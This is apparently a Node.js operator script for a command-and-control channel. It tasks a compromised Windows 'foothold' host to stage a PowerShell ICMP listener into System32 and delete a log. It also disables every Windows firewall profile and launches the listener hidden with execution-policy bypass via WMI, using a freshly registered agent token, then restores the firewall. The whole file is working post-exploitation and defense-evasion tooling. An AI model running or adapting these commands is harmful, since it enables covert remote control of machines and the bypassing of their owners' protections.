// guest-fw-ab.mjs <footholdId> — A/B: guest firewall OFF window around a listen2
// replica run (with a non-empty reply waiting), then firewall back ON. Decides
// firewall-vs-stack for the deaf guest socket. Also checks python presence.
const API = 'http://127.0.0.1:8971';
const FOOTHOLD = process.argv[2];
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
async function j(path, body) {
  const r = await fetch(API + path, body ? { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) } : undefined);
  return r.json();
}
async function waitTask(agentId, taskId, s = 40) {
  for (let i = 0; i < s / 2; i++) {
    await sleep(2000);
    const { tasks } = await j('/api/channel/tasks?agent=' + agentId);
    const x = (tasks || []).find((y) => y.taskId === taskId);
    if (x && x.status === 'resulted') return x.resultPreview;
  }
  return null;
}
console.log('PYTHON:', JSON.stringify(await (async () => { const t = await j('/api/channel/task', { agentId: FOOTHOLD, kind: 'shell', data: 'python --version 2>&1 & py --version 2>&1' }); return waitTask(FOOTHOLD, t.taskId, 30); })()));

const reg = await j('/api/channel/agent', { action: 'register', label: 'listen3-probe' });
console.log('probe identity:', reg.agentId);
await j('/api/channel/task', { agentId: reg.agentId, kind: 'note', data: 'fw-ab-nonempty-reply' }); // non-empty reply waiting

const st = await j('/api/channel/stage', { agentId: FOOTHOLD, name: 'guest-icmp-listen2.ps1', b64: (await import('node:fs')).readFileSync(new URL('./guest-icmp-listen2.ps1', import.meta.url)).toString('base64') });
console.log('staged:', await waitTask(FOOTHOLD, st.taskId, 30));
await j('/api/channel/task', { agentId: FOOTHOLD, kind: 'shell', data: 'del C:\Windows\Temp\icmp-listen2.log' });
await sleep(2500);
const off = await j('/api/channel/task', { agentId: FOOTHOLD, kind: 'shell', data: 'netsh advfirewall set allprofiles state off' });
console.log('FW OFF:', JSON.stringify(await waitTask(FOOTHOLD, off.taskId, 30)));
const wmi = "powershell -NoProfile -Command $r=Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Windows\System32\agentbox\guest-icmp-listen2.ps1 -AgentId " + reg.agentId + " -Token " + reg.token + "'}; $r.ReturnValue";
const lt = await j('/api/channel/task', { agentId: FOOTHOLD, kind: 'shell', data: wmi });
console.log('launch:', await waitTask(FOOTHOLD, lt.taskId, 30));
await sleep(22000);
const on = await j('/api/channel/task', { agentId: FOOTHOLD, kind: 'shell', data: 'netsh advfirewall set allprofiles state on' });
console.log('FW ON:', JSON.stringify(await waitTask(FOOTHOLD, on.taskId, 30)));
const t2 = await j('/api/channel/task', { agentId: FOOTHOLD, kind: 'shell', data: 'type C:\Windows\Temp\icmp-listen2.log' });
console.log('LISTEN2 LOG:', JSON.stringify(await waitTask(FOOTHOLD, t2.taskId, 40)));
